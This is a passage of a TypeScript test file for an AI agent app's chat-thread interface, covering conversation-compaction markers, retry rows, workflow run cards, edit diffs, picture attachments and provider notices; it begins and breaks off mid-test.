    const container = mount(threadOf(sample, props([])));
    expect(lines(container)).toHaveLength(1);
    expect(help(container)).toBe(false);
  });

  it('a marker at the place of each compaction: counts and time when the agent gave them, failed, stopped', () => {
    const at = NOW - 100_000;
    const entries: TranscriptEntry[] = [
      { kind: 'compaction', ts: at, outcome: 'done', tokensBefore: 222_822, tokensAfter: 31_204 },
      { kind: 'compaction', ts: at, outcome: 'done', tokensAfter: 9_000 },
      { kind: 'compaction', ts: at, outcome: 'failed', retry: true },
      { kind: 'compaction', ts: at, outcome: 'failed' },
      { kind: 'compaction', ts: at, outcome: 'stopped' },
      { kind: 'compaction', ts: 0, outcome: 'stopped' },
    ];
    const container = mount(
      threadOf({ ...work([...entries, answer('Done.', NOW - 1_000)]), turn: null, lastEnd: null }),
    );
    const clockAt = formatClock(at);
    expect([...container.querySelectorAll('[data-compaction-mark]')].map((m) => m.textContent)).toEqual([
      `${fill(CHAT.compactedTokens, { before: '222.8K', after: '31.2K' })} · ${clockAt}`,
      `${CHAT.compacted} · ${clockAt}`,
      `${CHAT.compactFailedRetry} · ${clockAt}`,
      `${CHAT.compactFailed} · ${clockAt}`,
      `${CHAT.compactStopped} · ${clockAt}`,
      CHAT.compactStopped,
    ]);
    expect(fill(CHAT.compactedTokens, { before: '222.8K', after: '31.2K' })).toBe(
      'Conversation compacted · 222.8K → 31.2K tokens',
    );
    expect(lines(container)).toHaveLength(0);
  });

  // Mutation: drop the `after * 100 > before * 99` check in compactionText → "236K → 235.9K tokens" and the rest.
  it('a compaction whose count did not fall (equal, higher, or under 1% lower) shows no numbers', () => {
    const at = NOW - 100_000;
    const entries: TranscriptEntry[] = [
      { kind: 'compaction', ts: at, outcome: 'done', tokensBefore: 235_952, tokensAfter: 235_939 },
      { kind: 'compaction', ts: at, outcome: 'done', tokensBefore: 235_952, tokensAfter: 235_952 },
      { kind: 'compaction', ts: at, outcome: 'done', tokensBefore: 235_952, tokensAfter: 236_100 },
      { kind: 'compaction', ts: at, outcome: 'done', tokensBefore: 10_000, tokensAfter: 9_901 },
      { kind: 'compaction', ts: at, outcome: 'done', tokensBefore: 10_000, tokensAfter: 9_900 },
    ];
    const container = mount(
      threadOf({ ...work([...entries, answer('Done.', NOW - 1_000)]), turn: null, lastEnd: null }),
    );
    const clockAt = formatClock(at);
    expect([...container.querySelectorAll('[data-compaction-mark]')].map((m) => m.textContent)).toEqual([
      `${CHAT.compacted} · ${clockAt}`,
      `${CHAT.compacted} · ${clockAt}`,
      `${CHAT.compacted} · ${clockAt}`,
      `${CHAT.compacted} · ${clockAt}`,
      `${fill(CHAT.compactedTokens, { before: '10K', after: '9,900' })} · ${clockAt}`,
    ]);
  });
});

describe('ChatThread: the retry line and its row', () => {
  const NOW = 1_794_411_600_000;
  type Retry = Extract<TranscriptEntry, { kind: 'notice'; code: 'retry' }>;
  const retry = (over: Partial<Retry> = {}): Retry => ({
    kind: 'notice',
    ts: NOW - 41_000,
    code: 'retry',
    cause: 'stalled',
    attempts: 2,
    max: 3,
    ...over,
  });
  const runningTool: TranscriptEntry = {
    kind: 'tool',
    ts: NOW - 120_000,
    id: 'r1',
    name: 'probe',
    title: 'Probe src/main.rs',
    status: 'in_progress',
  };
  const work = (entries: TranscriptEntry[], running = true): ThreadSample => ({
    mode: 'work',
    entries: [user('Fix the build', NOW - 600_000), ...entries],
    turns: [],
    turn: running ? { turnId: 't', phase: 'running', startedAt: NOW - 600_000, wait: null } : null,
    lastEnd: null,
  });
  type Request = NonNullable<NonNullable<ChatThreadProps['host']>['requests']>[number];
  const host = (requests: Request[]): ChatThreadProps['host'] => ({
    inference: 'ready',
    loading: [],
    resident: [{ modelId: 'qwen-a', sizeBytes: null }],
    answers: [{ modelId: 'qwen-a', inFlight: requests.length, maxConcurrent: 4, queued: 0, lastStart: NOW - 9_000 }],
    requests,
  });
  const reading = (startedAt: number, session = 'conv-1'): Request => ({
    session,
    modelId: 'qwen-a',
    phase: 'prefill',
    startedAt,
    prefillDone: 4_096,
    prefillTotal: 20_480,
    generated: null,
  });
  const props = (over: Partial<ChatThreadProps> = {}): Partial<ChatThreadProps> => ({
    conversationId: 'conv-1',
    model: 'qwen-a',
    host: host([]),
    ...over,
  });
  const lines = (container: HTMLElement): HTMLElement[] => [
    ...container.querySelectorAll<HTMLElement>('article[aria-busy="true"][data-wait-line]'),
  ];
  const rows = (container: HTMLElement): HTMLElement[] => [
    ...container.querySelectorAll<HTMLElement>('[data-notice-row="retry"]'),
  ];
  const tone = (row: HTMLElement | undefined): string | null =>
    row?.querySelector('[data-tone]')?.getAttribute('data-tone') ?? null;
  const timers = () =>
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval', 'setTimeout', 'clearTimeout'] });

  it('shows though a tool row still runs: the cause, the try, and the clock since the first try; no row yet', () => {
    timers();
    try {
      // The open episode is the stream's live copy: its row is placed at the next call or the turn's end.
      const container = mount(threadOf(work([runningTool]), props({ retry: retry() })));
      expect(lines(container)).toHaveLength(1);
      const line = lines(container)[0]!;
      expect(line.getAttribute('data-wait-line')).toBe('hold');
      expect(waitText(line)).toBe(`${CHAT.retry.live.stalled} · ${fill(CHAT.retry.try, { n: 2, max: 3 })}`);
      expect(line.querySelector('[data-wait-clock]')?.textContent).toBe('0:41');
      act(() => {
        vi.advanceTimersByTime(2_000);
      });
      expect(line.querySelector('[data-wait-clock]')?.textContent).toBe('0:43');
      expect(rows(container)).toEqual([]);
      // With only the prompt before it, it stands in for the pending line.
      rerender(threadOf(work([]), props({ retry: retry() })));
      expect(lines(container).map(waitText)).toEqual([
        `${CHAT.retry.live.stalled} · ${fill(CHAT.retry.try, { n: 2, max: 3 })}`,
      ]);
    } finally {
      vi.useRealTimers();
    }
  });

  it('its words by cause, and the try alone when the agent named no budget', () => {
    const container = mount(threadOf(work([]), props({ retry: retry() })));
    for (const cause of ['stalled', 'connection', 'server', 'busy', 'loop', 'recovery', 'other'] as const) {
      rerender(threadOf(work([]), props({ retry: retry({ cause, attempts: 1 }) })));
      expect(waitText(lines(container)[0])).toBe(
        `${CHAT.retry.live[cause]} · ${fill(CHAT.retry.try, { n: 1, max: 3 })}`,
      );
    }
    rerender(threadOf(work([]), props({ retry: retry({ max: 0 }) })));
    expect(waitText(lines(container)[0])).toBe(`${CHAT.retry.live.stalled} · ${fill(CHAT.retry.tryNoMax, { n: 2 })}`);
  });

  it("a meter when the engine lists this conversation's new request reading the prompt; an older or other one says nothing", () => {
    const sample = work([runningTool]);
    const container = mount(threadOf(sample, props({ retry: retry(), host: host([reading(NOW - 9_000)]) })));
    expect(byRole(container, 'meter', CHAT.pendingReadMeter)?.getAttribute('aria-valuenow')).toBe('20');
    rerender(threadOf(sample, props({ retry: retry(), host: host([reading(NOW - 60_000)]) })));
    expect(container.querySelector('[role="meter"]')).toBeNull();
    rerender(threadOf(sample, props({ retry: retry(), host: host([reading(NOW - 9_000, 'conv-2')]) })));
    expect(container.querySelector('[role="meter"]')).toBeNull();
    expect(lines(container)).toHaveLength(1);
  });

  it('first match wins: an open request card and the compaction line take its place', () => {
    const sample = work([runningTool]);
    const container = mount(threadOf(sample, props({ retry: retry(), asking: true })));
    expect(container.querySelector('[data-retry-line]')).toBeNull();
    rerender(
      threadOf(
        sample,
        props({ retry: retry(), compaction: { phase: 'running', startedAt: NOW - 5_000, tokensBefore: 90_000 } }),
      ),
    );
    expect(lines(container).map((l) => l.getAttribute('data-wait-line'))).toEqual(['fold']);
    rerender(threadOf(sample, props({ retry: retry() })));
    expect(lines(container).map((l) => l.getAttribute('data-wait-line'))).toEqual(['hold']);
    expect(container.querySelector('[data-retry-line]')?.getAttribute('data-retry-line')).toBe('stalled');
  });

  it('after: one quiet row in the turn; Gave up in the danger tone with the words; Retry not finished when no turn runs', () => {
    const recovered = retry({ endTs: NOW - 41_000 + 64_000, outcome: 'recovered' });
    const container = mount(threadOf(work([runningTool, recovered, answer('Fixed.', NOW)]), props()));
    expect(container.querySelector('[data-retry-line]')).toBeNull();
    expect(rows(container)).toHaveLength(1);
    const row = rows(container)[0]!;
    expect(row.textContent).toContain(CHAT.retry.row);
    expect(row.textContent).toContain(CHAT.retry.cause.stalled);
    expect(row.textContent).toContain(
      `${fill(CHAT.retry.tries, { n: 2 })} · ${fill(CHAT.retry.waited, { time: '1m 04s' })}`,
    );
    expect(row.textContent).toContain(formatClock(NOW - 41_000));
    expect(tone(row)).toBe('neutral');
    expect(row.querySelector('button, a, [tabindex]')).toBeNull();

    const gaveUp = retry({ cause: 'server', attempts: 3, endTs: NOW, outcome: 'gave-up', detail: 'API error‮ 500' });
    rerender(threadOf(work([gaveUp, end('error', NOW + 10)], false), props()));
    const failedRow = rows(container)[0]!;
    expect(failedRow.textContent).toContain(CHAT.retry.rowGaveUp);
    expect(failedRow.textContent).toContain(CHAT.retry.cause.server);
    expect(failedRow.textContent).toContain(fill(CHAT.retry.tries, { n: 3 }));
    expect(failedRow.textContent).not.toContain(fill(CHAT.retry.waited, { time: '' }).trim());
    expect(failedRow.textContent).toContain('API error\\u{202E} 500');
    expect(tone(failedRow)).toBe('danger');

    // Stopped by the user: the turn end closed it with no outcome.
    rerender(threadOf(work([retry({ attempts: 1, endTs: NOW }), end('cancelled', NOW + 10)], false), props()));
    expect(rows(container)[0]!.textContent).toContain(
      `${CHAT.retry.row}${CHAT.retry.cause.stalled}${CHAT.retry.triesOne}`,
    );

    // The agent stopped mid-retry: no end, and no turn runs.
    rerender(threadOf(work([retry({ attempts: 1 })], false), props()));
    expect(lines(container)).toEqual([]);
    const open = rows(container)[0]!;
    expect(open.textContent).toContain(CHAT.retry.rowOpen);
    expect(open.textContent).toContain(CHAT.retry.triesOne);
    expect(tone(open)).toBe('warning');
  });

  it('says once that the agent tries again, not again for the next try, and that the model answers again', () => {
    const onStatus = vi.fn();
    const said = fill(CHAT.retry.status, { cause: CHAT.retry.cause.stalled });
    const container = mount(threadOf(work([]), props({ onStatus, retry: retry({ attempts: 1 }) })));
    expect(onStatus.mock.calls).toEqual([[said]]);
    rerender(threadOf(work([]), props({ onStatus, retry: retry({ attempts: 2 }) })));
    expect(onStatus.mock.calls).toEqual([[said]]);
    const back = retry({ attempts: 2, endTs: NOW, outcome: 'recovered' });
    rerender(threadOf(work([thinking('Again', NOW, NOW + 10)]), props({ onStatus, retry: back })));
    expect(onStatus.mock.calls).toEqual([[said], [CHAT.retry.statusBack]]);
    expect(lines(container)).toEqual([]);
  });

  it('Chat shows the same line and row', () => {
    const chat = (entries: TranscriptEntry[], running: boolean): ThreadSample => ({
      ...work(entries, running),
      mode: 'chat',
    });
    const container = mount(threadOf(chat([], true), props({ retry: retry({ cause: 'connection', attempts: 1 }) })));
    expect(waitText(lines(container)[0])).toBe(
      `${CHAT.retry.live.connection} · ${fill(CHAT.retry.try, { n: 1, max: 3 })}`,
    );
    const done = retry({ cause: 'connection', attempts: 1, endTs: NOW, outcome: 'recovered' });
    rerender(threadOf(chat([done, answer('Fixed.', NOW), end('end_turn', NOW + 10)], false), props()));
    expect(rows(container)[0]!.textContent).toContain(`${CHAT.retry.row}${CHAT.retry.cause.connection}`);
  });
});

describe('ChatThread: the workflow run block', () => {
  const card = (container: HTMLElement): HTMLElement => {
    const found = container.querySelector<HTMLElement>(`section[data-run="${RUN_ID}"]`);
    if (found == null) throw new Error('no run block');
    return found;
  };
  const chips = (container: HTMLElement): string[] =>
    [...card(container).querySelectorAll('button[aria-pressed][data-mark]')].map((chip) =>
      chip.getAttribute('data-mark')!,
    );
  const heading = (container: HTMLElement): string => card(container).querySelector('h3')?.textContent ?? '';
  const stopNone = (): Promise<void> => Promise.resolve();
  const status = (container: HTMLElement): string =>
    card(container).querySelector('header [data-tone]')?.textContent ?? '';

  it('running: name, status, step line, agents used of the budget, the list by need, and Stop run', () => {
    const container = mount(threadOf(runSample(workflowRun()), { runs: [runView(RUN_ID)], onStopRun: stopNone }));
    expect(heading(container)).toBe(`${CHAT.run.namePrefix}deep-research`);
    const text = card(container).textContent ?? '';
    expect(status(container)).toBe(CHAT.run.status.running);
    expect(text).toContain(fill(CHAT.run.step, { i: 2, n: 4, phase: 'Research' }));
    expect(text).toContain(fill(CHAT.run.agentsUsed, { used: 5, budget: 128 }));
    expect(chips(container)).toEqual(['done', 'active', 'pending', 'pending']);
    // 5 of 128 is under 75% used: the budget is text only.
    expect(byRole(card(container), 'meter')).toBeNull();
    expect(text).toContain(fill(CHAT.run.groups.attention, { n: 1 }));
    expect(text).toContain(fill(CHAT.run.groups.running, { n: 1 }));
    for (const label of ['researcher-0', 'researcher-1']) expect(text).toContain(label);
    expect(text).toContain(CHAT.agent.state.failed);
    const done = allByRole(card(container), 'button').find((b) => b.textContent?.startsWith('Done ('))!;
    expect(done.getAttribute('aria-expanded')).toBe('false');
    act(() => done.click());
    expect(card(container).textContent).toContain('Plan · 2m 47s · 11K tokens used');
    expect(byRole(card(container), 'button', CHAT.run.buttons.stop)).not.toBeNull();
    expect(card(container).getAttribute('aria-busy')).toBe('true');
  });

  it('Stop run asks first, keeps running on the cancel button, and sends the run id on confirm', async () => {
    const onStopRun = vi.fn(() => Promise.resolve());
    const container = mount(threadOf(runSample(workflowRun()), { runs: [runView(RUN_ID)], onStopRun }));
    act(() => byRole(card(container), 'button', CHAT.run.buttons.stop)!.click());
    await waitFor(() => byRole(document.body, 'dialog') !== null);
    const dialog = byRole(document.body, 'dialog')!;
    expect(dialog.textContent).toContain(CHAT.run.stopTitle);
    expect(dialog.textContent).toContain(CHAT.run.stopText.runningOne);
    const keep = allByRole(dialog, 'button').find((b) => b.textContent === CHAT.run.buttons.keepRunning)!;
    act(() => keep.click());
    expect(onStopRun).not.toHaveBeenCalled();
    act(() => byRole(card(container), 'button', CHAT.run.buttons.stop)!.click());
    await waitFor(() => byRole(document.body, 'dialog') !== null);
    const confirm = allByRole(byRole(document.body, 'dialog')!, 'button').find(
      (b) => b.textContent === CHAT.run.buttons.stopWorkflow,
    )!;
    await act(async () => {
      confirm.click();
      await Promise.resolve();
    });
    expect(onStopRun).toHaveBeenCalledWith(RUN_ID);
  });

  it('stopping: the status says so and Stop run is gone', () => {
    const container = mount(
      threadOf(runSample(workflowRun()), { runs: [runView(RUN_ID, { stopping: true })], onStopRun: stopNone }),
    );
    expect(status(container)).toBe(CHAT.run.status.stopping);
    expect(byRole(card(container), 'button', CHAT.run.buttons.stop)).toBeNull();
  });

  it('waiting: a helper of this run asks, the card says who, and the request card below is not the turn waiting', () => {
    const container = mount(
      threadOf(runSample(workflowRun()), {
        runs: [runView(RUN_ID)],
        agentAsks: [
          {
            id: 'p1',
            child: 'a1',
            run: 'deep-research',
            label: 'researcher-0',
            title: 'curl -s https://example.com',
            access: 'other',
            openedAt: T0,
          },
        ],
        onStopRun: stopNone,
        card: createElement('div', { 'data-interaction-card': '' }, 'Allow this command?'),
      }),
    );
    const text = card(container).textContent ?? '';
    expect(status(container)).toBe(CHAT.run.status.waitingYou);
    expect(text).toContain(fill(CHAT.run.asks.other, { label: 'researcher-0' }));
    expect(byRole(card(container), 'button', CHAT.run.buttons.stop)).not.toBeNull();
    // The request card is drawn at the thread's end, after the run card.
    const request = container.querySelector('[data-interaction-card]')!;
    expect(card(container).compareDocumentPosition(request) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
  });

  it('a run with no turn: no wait line says the agent works; the live run card is the only sign', () => {
    const container = mount(
      threadOf(runSample(workflowRun()), {
        runs: [runView(RUN_ID)],
        conversationId: 'conv-1',
        host: { inference: 'ready', loading: [], resident: [], answers: [], requests: [] },
      }),
    );
    expect(container.querySelector('[data-wait-line]')).toBeNull();
    expect(container.querySelector('[data-compaction-line]')).toBeNull();
    expect(status(container)).toBe(CHAT.run.status.running);
  });

  it('a wake turn while a run is live shows the wait line as for any turn', () => {
    const sample = runSample(workflowRun(), {
      turnId: 'w1',
      phase: 'running',
      startedAt: T0 + 800,
      wait: null,
      origin: 'wake',
    });
    const container = mount(threadOf(sample, { runs: [runView(RUN_ID)] }));
    expect(container.querySelector('[data-wait-line]')).not.toBeNull();
  });

  it('done: Done, no step line, no Stop run, the report open as Markdown, the helpers closed', () => {
    const container = mount(threadOf(runSample(finishedRun())));
    const text = card(container).textContent ?? '';
    expect(status(container)).toBe(fill(CHAT.run.status.donePartly, { n: 1, m: 3 }));
    expect(text).not.toContain('Step ');
    expect(text).toContain(fill(CHAT.run.agentsUsed, { used: 8, budget: 128 }));
    expect(byRole(card(container), 'button', CHAT.run.buttons.stop)).toBeNull();
    // The step chip "Report" has the same name: the fold is the button that opens a region.
    const report = allByRole(card(container), 'button', CHAT.run.links.report).find((b) =>
      b.hasAttribute('aria-expanded'),
    )!;
    expect(report.getAttribute('aria-expanded')).toBe('true');
    expect(text).toContain('Findings');
    expect(card(container).querySelector('strong')?.textContent).toBe('4 lanes');
    // The run ended: its failed agent stays in view, the rest fold under Agents.
    expect(text).toContain(fill(CHAT.run.groups.attention, { n: 1 }));
    expect(
      byRole(card(container), 'button', fill(CHAT.run.groups.agents, { n: 2 }))?.getAttribute('aria-expanded'),
    ).toBe('false');
    expect(chips(container)).toEqual(['done', 'done', 'done', 'done']);
  });

  it('a report the agent cut says so: over 16,380 bytes and ending in …', () => {
    const container = mount(threadOf(runSample(finishedRun({ report: `${'x'.repeat(16_380)}…` }))));
    expect(card(container).textContent).toContain(CHAT.run.reportCut.note);
  });

  it('ended early: active on disk but not held by the host reads "Ended early", with no Stop run', () => {
    const container = mount(threadOf(runSample(workflowRun()), { runs: [], onStopRun: stopNone }));
    const text = card(container).textContent ?? '';
    expect(status(container)).toBe(CHAT.run.status.endedEarly);
    expect(text).not.toContain('Step ');
    expect(byRole(card(container), 'button', CHAT.run.buttons.stop)).toBeNull();
  });

  it('paused, out of helpers, failed and stopped: their words, a pause message, and no Stop run', () => {
    const cases: Array<[NonNullable<Parameters<typeof workflowRun>[0]>, string]> = [
      [{ status: 'user_paused', pauseMessage: 'Waiting for a key' }, CHAT.run.status.paused],
      [{ status: 'budget_limited' }, CHAT.run.status.outOfAgents],
      [{ status: 'failed' }, fill(CHAT.run.status.failedStep, { i: 2, phase: 'Research' })],
      [{ status: 'cancelled' }, fill(CHAT.run.status.stoppedStep, { i: 2, phase: 'Research' })],
      [{ status: 'blocked' }, CHAT.run.status.paused],
    ];
    for (const [over, word] of cases) {
      const container = mount(threadOf(runSample(workflowRun(over)), { runs: [runView(RUN_ID)], onStopRun: stopNone }));
      expect(status(container), word).toBe(word);
      expect(byRole(card(container), 'button', CHAT.run.buttons.stop), word).toBeNull();
      if (over.pauseMessage !== undefined)
        expect(card(container).textContent).toContain(fill(CHAT.run.pausedBecause, { message: 'Waiting for a key' }));
      act(() => mounted!.root.unmount());
      container.remove();
      mounted = undefined;
    }
  });

  it('a run with no budget says how many helpers it used', () => {
    const container = mount(threadOf(runSample(workflowRun({ agentBudget: null }))));
    expect(card(container).textContent).toContain(fill(CHAT.run.agentsUsedNoBudget, { used: 5 }));
    expect(byRole(card(container), 'meter')).toBeNull();
  });
});

describe('ChatThread: edit diffs', () => {
  const FOLDER = '/w/proj';
  const edit = (overrides: Partial<Extract<TranscriptEntry, { kind: 'tool' }>> = {}): TranscriptEntry => ({
    kind: 'tool',
    ts: T0 + 200,
    endTs: T0 + 400,
    id: 'call_edit',
    name: 'search_replace',
    title: 'Edit `src/app.ts`',
    status: 'completed',
    input: JSON.stringify({ file_path: 'src/app.ts', old_string: 'a', new_string: 'b' }),
    edits: [
      {
        path: `${FOLDER}/src/app.ts`,
        added: 4,
        removed: 2,
        hunks: [{ start: [10, 10], body: ' keep\n-old one\n-old two\n+new 1\n+new 2\n+new 3\n+new 4' }],
      },
    ],
    ...overrides,
  });
  const work = (tool: TranscriptEntry, running = false): ThreadSample => ({
    mode: 'work',
    entries: running ? [user('Change the port', T0), tool] : [user('Change the port', T0), tool, end()],
    turns: [],
    turn: running ? { turnId: 't1', phase: 'running', startedAt: T0, wait: null } : null,
    lastEnd: null,
  });
  const rowButton = (container: HTMLElement) =>
    [...container.querySelectorAll('button[aria-expanded]')].find((b) =>
      (b.getAttribute('aria-label') ?? '').startsWith(CHAT.workEdit[1]),
    ) as HTMLButtonElement | undefined;

  it('the row says +4 −2 and opens to the diff, numbers relative to the folder path', () => {
    const container = mount(threadOf(work(edit()), { folder: FOLDER }));
    const button = rowButton(container)!;
    expect(button.getAttribute('aria-label')).toContain(fill(CHAT.diff.counts, { added: 4, removed: 2 }));
    expect(button.getAttribute('aria-label')).toContain('src/app.ts');
    expect(button.getAttribute('aria-expanded')).toBe('false');
    act(() => button.click());
    const figure = byRole(container, 'figure')!;
    expect(figure.getAttribute('aria-label')).toBe(
      `${fill(CHAT.diff.label, { path: 'src/app.ts' })}: ${fill(CHAT.diff.countsSr, { added: 4, removed: 2 })}`,
    );
    expect(figure.querySelectorAll('[data-mark="removed"]')).toHaveLength(2);
    expect(figure.querySelector('figcaption')).toBeNull();
    expect(byRole(container, 'figure', CHAT.change)).toBeNull();
  });

  it('a new file says so, and a write before its result says it writes the whole file', () => {
    const created = edit({
      name: 'write',
      edits: [
        { path: `${FOLDER}/notes.md`, create: true, added: 40, removed: 0, hunks: [{ start: [0, 1], body: '+a' }] },
      ],
    });
    let container = mount(threadOf(work(created), { folder: FOLDER }));
    expect(rowButton(container)!.getAttribute('aria-label')).toContain(`${CHAT.diff.newFile} · +40`);
    act(() => mounted!.root.unmount());
    const asked = edit({
      name: 'write',
      status: 'in_progress',
      edits: [{ path: `${FOLDER}/notes.md`, added: 40, removed: 0, hunks: [{ start: [0, 1], body: '+a' }] }],
    });
    container = mount(threadOf(work(asked, true), { folder: FOLDER }));
    const button = container.querySelector<HTMLButtonElement>('button[aria-expanded]')!;
    expect(button.getAttribute('aria-label')).toContain(`${CHAT.diff.wholeFile} · +40`);
    act(() => button.click());
    expect(byRole(container, 'figure')!.querySelector('figcaption')!.textContent).toBe(CHAT.diff.pending);
  });

  it('a failed edit heads its diff "Not applied" and shows the agent’s error under it', () => {
    const container = mount(
      threadOf(work(edit({ status: 'failed', output: 'No matches found for old_string' })), { folder: FOLDER }),
    );
    act(() => container.querySelector<HTMLButtonElement>('button[aria-expanded]')!.click());
    const figure = byRole(container, 'figure')!;
    expect(figure.querySelector('figcaption')!.textContent).toBe(CHAT.diff.notApplied);
    const output = container.querySelector(`figure[aria-label="${CHAT.output}"]`)!;
    expect(output.textContent).toContain('No matches found for old_string');
    expect(figure.compareDocumentPosition(output) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
  });

  it('an edit Auto allowed says so before its counts, and shows the card’s file before the diff', () => {
    const card = {
      kind: 'permission' as const,
      id: 'i1',
      toolCallId: 'call_edit',
      openedAt: T0 + 250,
      toolName: 'search_replace',
      access: 'edit' as const,
      title: 'Edit src/app.ts',
      input: '{}',
      command: null,
      path: 'src/app.ts',
      resolvedPath: null,
      options: [],
      flags: [],
    };
    const container = mount(
      threadOf(work(edit()), {
        folder: FOLDER,
        marks: [{ kind: 'allowed', at: T0 + 300, mode: 'auto', toolCallId: 'call_edit', access: 'edit', card }],
      }),
    );
    const button = rowButton(container)!;
    expect(button.getAttribute('aria-label')).toContain(
      `${CHAT.permission.allowed.auto} · ${fill(CHAT.diff.counts, { added: 4, removed: 2 })}`,
    );
    act(() => button.click());
    const file = container.querySelector(`pre[aria-label="${CHAT.permFile}"]`)!;
    const figure = byRole(container, 'figure', undefined)!;
    expect(file.textContent).toBe('src/app.ts');
    expect(file.compareDocumentPosition(figure) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
  });

  it('the row opens by itself while its request waits, once; the person may close it again', () => {
    const asked = edit({ status: 'pending', endTs: undefined });
    const container = mount(threadOf(work(asked, true), { folder: FOLDER, askCalls: new Set() }));
    const button = () => container.querySelector<HTMLButtonElement>('button[aria-expanded]')!;
    expect(button().getAttribute('aria-expanded')).toBe('false');
    const open = new Set(['call_edit']);
    rerender(threadOf(work(asked, true), { folder: FOLDER, askCalls: open }));
    expect(button().getAttribute('aria-expanded')).toBe('true');
    expect(byRole(container, 'figure')!.querySelector('figcaption')!.textContent).toBe(CHAT.diff.pending);
    expect(document.activeElement).not.toBe(button());
    act(() => button().click());
    rerender(threadOf(work(asked, true), { folder: FOLDER, askCalls: open }));
    expect(button().getAttribute('aria-expanded')).toBe('false');
  });

  it('a write whose input was cut too long to read is still an edit row, named by its diff block', () => {
    const cut = edit({
      name: 'write',
      input: '{\n  "file_path": "docs/big.md",\n  "content": "aaaa',
      truncated: true,
      edits: [
        { path: `${FOLDER}/docs/big.md`, create: true, added: 900, removed: 0, hunks: [{ start: [0, 1], body: '+a' }] },
      ],
    });
    const container = mount(threadOf(work(cut), { folder: FOLDER }));
    const button = rowButton(container)!;
    expect(button.getAttribute('aria-label')).toContain('docs/big.md');
    expect(button.getAttribute('aria-label')).toContain(`${CHAT.diff.newFile} · +900`);
  });

  it('an edit with no diff blocks still shows the change its input asks for', () => {
    const container = mount(threadOf(work(edit({ edits: undefined })), { folder: FOLDER }));
    act(() => rowButton(container)!.click());
    expect(byRole(container, 'figure', CHAT.change)!.textContent).toContain('- a');
  });
});

describe('ChatThread: pictures in tool results', () => {
  const FOLDER = '/w/proj';
  const P = CHAT.pictures;
  const read = (path: string, overrides: Partial<Extract<TranscriptEntry, { kind: 'tool' }>>): TranscriptEntry => ({
    kind: 'tool',
    ts: T0 + 200,
    endTs: T0 + 500,
    id: `call_${path}`,
    name: 'read_file',
    title: `Read \`${path}\``,
    status: 'completed',
    input: JSON.stringify({ target_file: path }),
    ...overrides,
  });
  const shot = read('docs/shot.png', { pictures: [{ n: 0, mediaType: 'image/png', bytes: 412 * 1024 }] });
  const pdf = read('spec.pdf', {
    pictures: [4, 5, 6].map((page, n) => ({ n, mediaType: 'image/jpeg', bytes: 489_335, page })),
    pdfPages: 12,
  });
  const rows = (container: HTMLElement) =>
    [...container.querySelectorAll('button[aria-expanded]')].filter((b) =>
      (b.getAttribute('aria-label') ?? '').startsWith(CHAT.workRead[1]),
    ) as HTMLButtonElement[];

  it('the read row says "1 picture · 412 KB" or "3 of 12 pages · 1.4 MB" and has no Output', () => {
    const container = mount(
      threadOf(
        { mode: 'work', entries: [user('Look', T0), shot, pdf, end()], turns: [], turn: null, lastEnd: null },
        { folder: FOLDER, conversationId: 'conv-1' },
      ),
    );
    const [one, three] = rows(container);
    expect(one!.getAttribute('aria-label')).toContain(`${P.one} · 412 KB`);
    expect(one!.getAttribute('aria-label')).toContain('docs/shot.png');
    expect(three!.getAttribute('aria-label')).toContain(`${fill(P.pages, { n: 3, total: 12 })} · 1.4 MB`);
    expect(container.textContent).toContain(`${P.one} · 412 KB`);
    expect(byRole(container, 'list', P.label)).toBeNull();
    act(() => three!.click());
    const list = byRole(container, 'list', P.label)!;
    expect([...list.querySelectorAll('li > [aria-hidden="true"]')].map((n) => n.textContent)).toEqual(
      [4, 5, 6].map((page) => fill(P.page, { page })),
    );
    expect(list.querySelectorAll('[data-state="loading"]')).toHaveLength(3);
    expect(byRole(container, 'figure', CHAT.output)).toBeNull();
  });

  it('a read row with no pictures keeps its plain detail and its Output', () => {
    const text = read('src/a.ts', { output: '1→const a = 1;' });
    const container = mount(
      threadOf(
        { mode: 'work', entries: [user('Look', T0), text, end()], turns: [], turn: null, lastEnd: null },
        { folder: FOLDER, conversationId: 'conv-1' },
      ),
    );
    const [row] = rows(container);
    expect(row!.getAttribute('aria-label')).not.toContain(P.one);
    act(() => row!.click());
    expect(byRole(container, 'list', P.label)).toBeNull();
    expect(byRole(container, 'figure', CHAT.output)!.textContent).toContain('const a = 1;');
  });
});

describe('ChatThread: long threads', () => {
  it(`mounts the newest ${MOUNTED_TURNS} turns and shows the earlier ones on request`, () => {
    const container = mount(threadOf(longThread(MOUNTED_TURNS + 5)));
    expect(container.querySelectorAll('[data-turn]')).toHaveLength(MOUNTED_TURNS);
    expect(container.textContent).not.toContain('Question 4 ');
    act(() => byRole(container, 'button', 'Show 5 earlier turns')!.click());
    expect(container.querySelectorAll('[data-turn]')).toHaveLength(MOUNTED_TURNS + 5);
    expect(container.textContent).toContain('Question 0');
  });
});

describe('ConversationNotices', () => {
  it('one alert per provider with a link to the settings', () => {
    const container = mount(
      createElement(
        MemoryRouter,
        null,
        createElement(ConversationNotices, {
          notices: [
            { code: 'key-printed', tone: 'danger', provider: 'exa' },
            { code: 'key-printed', tone: 'danger', provider: 'exa' },
          ],
        }),
      ),
    );
    expect(container.querySelectorAll('[role="alert"]')).toHaveLength(1);
    expect(anchors(container)).toContain('/providers');
    expect(container.textContent).not.toContain(fill(CHAT.notices.more, { n: 1 }));
  });

  it('one shows, newest first; the others wait behind "+n"', async () => {
    const container = mount(
      createElement(
        MemoryRouter,
        null,
        createElement(ConversationNotices, {
          notices: [
            { code: 'key-printed', tone: 'danger', provider: 'exa' },
            { code: 'key-printed', tone: 'danger', provider: 'brave' },
          ],
        }),
      ),
    );
    expect(container.querySelectorAll('[role="alert"]')).toHaveLength(1);
    expect(container.textContent).toContain(fill(CHAT.keyPrinted, { provider: 'Brave' }));
    expect(container.textContent).not.toContain(fill(CHAT.keyPrinted, { provider: 'Exa' }));
    const more = byRole(container, 'button', fill(CHAT.notices.moreName, { n: 1 }))!;
    expect(more.textContent).toBe(fill(CHAT.notices.more, { n: 1 }));
    act(() => more.click());
    await waitFor(() => document.body.textContent?.includes(fill(CHAT.keyPrinted, { provider: 'Exa' })) === true);
  });

  it('the one-line look: icon, the sentence cut with its whole text as title, and a close button', () => {
    const onClose = vi.fn();
    const container = mount(
      createElement(NoticeLine, {
        tone: 'warning',
        text: 'Thinking level not set. This answer runs at the agent’s level.',
